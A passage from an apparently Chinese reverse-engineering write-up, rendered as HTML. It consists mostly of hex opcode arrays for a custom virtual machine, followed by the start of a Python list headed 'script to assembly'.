class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0C</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2D</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line"><span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE1</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE4</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line"><span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line"><span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE4</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line"><span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x05</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE2</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE4</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x09</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, </span><br><span class="line"><span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE3</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, </span><br><span class="line"><span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0E</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, </span><br><span class="line"><span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span></span><br></pre></td></tr></table></figure>

<p>脚本转汇编</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">opcode=[<span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x23</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x26</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x2A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0C</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2D</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x09</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE3</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, </span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  